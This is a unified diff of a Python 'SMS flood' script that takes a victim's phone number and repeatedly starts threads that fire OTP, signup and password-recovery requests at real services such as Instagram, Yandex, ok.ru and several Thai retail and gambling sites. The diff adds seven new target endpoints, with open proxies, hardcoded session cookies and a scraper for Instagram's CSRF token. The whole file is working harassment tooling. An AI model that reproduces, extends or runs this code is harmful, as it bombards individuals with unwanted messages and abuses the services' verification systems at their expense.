@@ -1,26 +1,26 @@
-import re
 import requests,json,time, sys
-import threading, random, os, colorama, time, sys
+import threading, os, time, sys
 from requests import Session
 from threading import Thread
 from re import search
+
 from colorama import Fore, init
-from colorama import Back as bg
 from requests import get
 
+os.system('cls')
 
 init(convert=True)
 textcol = f"{Fore.BLACK}"
 
 def head():
     print(f"""{Fore.RED}\n\n
-                {Fore.RESET}                            [ > SMS Spam BY Oreo Young Man < ]                                   
+                {Fore.RESET}                            [ > FLOOD SMS BY OREO YOUNG MAN< ]                                   
                 {Fore.RESET}                                            
-                {Fore.RESET}               [+] | Usage : [PHONE_NUMBER] [AMOUNT(SECOND)]
-                {Fore.RESET}               [+] | METHOD : 17 API                      
+                {Fore.RESET}               [+] | Usage : [PHONE] [AMOUNT]
+                {Fore.RESET}               [+] | METHOD : 24 Api                     
+                                                                                                                   
                                                                                                                    """)
         
-
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -36,10 +36,15 @@ print("\n\n")
 num = input (" [!] | Enter PhoneNumber : > ")
 newpage()
 print('\n\n')
-n = int(input(" [+] | Amount : > "))
+amount = int(input(" [+] | Amount : > "))
 session = requests.Session()
 
 headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
+
+def ig_token():
+    d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
+    d=search("csrftoken=(.*);",d).group(1).split(";")
+    return d[0],d[10].replace(" Secure, ig_did=","")
 
 class SMS():
 
@@ -97,7 +102,7 @@ class SMS():
         requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
         requests.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
 
-    def unacademy(phone):
+    def academy(phone):
         requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers=headers).json()
 
     def yandex(phone):
@@ -120,20 +125,33 @@ class SMS():
             headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36"}).text).group(1)}'''}))
         time.sleep(0.5)
 
-def ig_token():
-    d=get("https://www.instagram.com/",headers=headers).headers['set-cookie']
-    d=search("csrftoken=(.*);",d).group(1).split(";")
-    return d[0],d[10].replace(" Secure, ig_did=","")
+    def prettygame(phone):
+      requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data = {"tel":phone,"otp_type":"register"}, headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"}, proxies = {"http": "http://182.52.103.144:8080"})
+
+    def kaitorasap(phone):
+      requests.post("https://www.kaitorasap.co.th/api/index.php/send-otp/", data="phone_number="+phone+"&lag=", headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Cookie": "PHPSESSID=f5nrukmps3fa5gk25eh4v0tgg0; _ga=GA1.3.1240095898.1635597163; _gid=GA1.3.747741928.1635597163; _gat_gtag_UA_141105037_1=1"},proxies = {"http": "http://185.104.252.10:9090"})
+
+    def fox888(phone):
+      requests.post("https://www.fox888.com/api/otp/register", data = "applicant="+phone+"&serviceName=FOX888", headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "X-Requested-With": "XMLHttpRequest"})
+
+    def foodland(phone):
+      requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})
+
+    def shoponline(phone):
+      requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data = "phone="+phone+"&type=phone&resend=0&pinid=", headers = {"accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "x-requested-with": "XMLHttpRequest", "user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36", "cookie": "sqzllocal=sqzl614a950a0000008a8892;private_content_version=a8f313c36d800596d69c0634f8364ba7;PHPSESSID=0bfasg27occf98ngcr0p3mqlt7;_gcl_au=1.1.1797077583.1635431429;_hjid=16751239-bad6-46a9-b2f0-01bb94d26f2b;sqzl_session_id=617ab409000003ef5950|1635431433.703;_ga=GA1.4.1468961660.1635431432;_gid=GA1.4.108830963.1635431434;_gid=GA1.3.108830963.1635431434;_fbp=fb.2.1635431435074.169114230;sqzl_abs=0;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=1;mage-cache-storage=%7B%7D;mage-cache-storage-section-invalidation=%7B%7D;mage-cache-sessid=true;form_key=Pl5vFXKEPwQqulEz;mage-messages=;recently_viewed_product=%7B%7D;recently_viewed_product_previous=%7B%7D;recently_compared_product=%7B%7D;recently_compared_product_previous=%7B%7D;product_data_storage=%7B%7D;_ga_V7G71JV0ES=GS1.1.1635431429.1.1.1635431596.18;_ga=GA1.3.1468961660.1635431432;section_data_ids=%7B%22messages%22%3A1635431607%2C%22customer%22%3A1635431607%2C%22compare-products%22%3A1635431607%2C%22last-ordered-items%22%3A1635431607%2C%22cart%22%3A1635431742%2C%22directory-data%22%3A1635431607%2C%22instant-purchase%22%3A1635431607%2C%22persistent%22%3A1635431607%2C%22review%22%3A1635431607%2C%22wishlist%22%3A1635431607%2C%22ammessages%22%3A1635431607%2C%22gtm%22%3A1635431607%2C%22recently_viewed_product%22%3A1635431607%2C%22recently_compared_product%22%3A1635431607%2C%22product_data_storage%22%3A1635431607%2C%22paypal-billing-agreement%22%3A1635431607%2C%22checkout-fields%22%3A1635431607%2C%22collection-point-result%22%3A1635431607%7D"})
+
+    def wongnai(phone):
+      requests.post('https://www.wongnai.com/_api/guest.json?_v=6.053&locale=th&_a=phoneLogIn', json={f'phoneno={phone}&retrycount=0'}, headers={'"content-type": "application/x-www-form-urlencoded",'})
 
 
-def instagram(phone):
-    token,_=ig_token()
-    requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
+    def instagram(phone):
+        token,_=ig_token()
+        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username=66{phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
 
 
-def instagramv2(phone):
-    token,cid=ig_token()
-    requests.post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
+    def instagramv2(phone):
+        token,cid=ig_token()
+        requests.post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/",data=f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","X-CSRFToken":token}).json()
 
 
 def loop1():
@@ -193,37 +211,71 @@ def loop12():
 
 def loop13():
     global num
-    SMS.icq(num)
+    SMS.academy(num)
     print("ATTACK SMS | METHOD : ACADEMY")
 
 def loop14():
     global num
-    SMS.icq(num)
+    SMS.yandex(num)
     print("ATTACK SMS | METHOD : YANDEX")
 
 def loop14():
     global num
-    SMS.icq(num)
+    SMS.homepro(num)
     print("ATTACK SMS | METHOD : HOMEPRO")
 
 def loop15():
     global num
-    SMS.icq(num)
+    SMS.findclone(num)
     print("ATTACK SMS | METHOD : FINDCLONE")
 
 def loop16():
     global num
-    SMS.icq(num)
+    SMS.instagram(num)
     print("ATTACK SMS | METHOD : IG-V1")
 
 def loop17():
     global num
-    SMS.icq(num)
+    SMS.instagramv2(num)
     print("ATTACK SMS | METHOD : IG-V2")
 
+def loop18():
+    global num
+    SMS.foodland(num)
+    print("ATTACK SMS | METHOD : FOODLAND")
 
-for i in range(n):
-    time.sleep(0.50)
+def loop19():
+    global num
+    SMS.wongnai(num)
+    print("ATTACK SMS | METHOD : WONGNAI")
+
+def loop20():
+    global num
+    SMS.fox888(num)
+    print("ATTACK SMS | METHOD : FOX")
+
+def loop21():
+    global num
+    SMS.wongnai(num)
+    print("ATTACK SMS | METHOD : WONGNAI")
+
+def loop22():
+    global num
+    SMS.shoponline(num)
+    print("ATTACK SMS | METHOD : SHOPONILNE")
+
+def loop23():
+    global num
+    SMS.prettygame(num)
+    print("ATTACK SMS | METHOD : PRETTYGAME")
+
+def loop24():
+    global num
+    SMS.kaitorasap(num)
+    print("ATTACK SMS | METHOD : KAITORASAP")
+
+for _ in range(amount):
+    time.sleep(0.60)
     threading.Thread(target=loop1).start()
     threading.Thread(target=loop2).start()
     threading.Thread(target=loop3).start()
@@ -239,3 +291,10 @@ for i in range(n):
     threading.Thread(target=loop15).start()
     threading.Thread(target=loop16).start()
     threading.Thread(target=loop17).start()
+    threading.Thread(target=loop18).start()
+    threading.Thread(target=loop19).start()
+    threading.Thread(target=loop20).start()
+    threading.Thread(target=loop21).start()
+    threading.Thread(target=loop22).start()
+    threading.Thread(target=loop23).start()
+    threading.Thread(target=loop24).start()
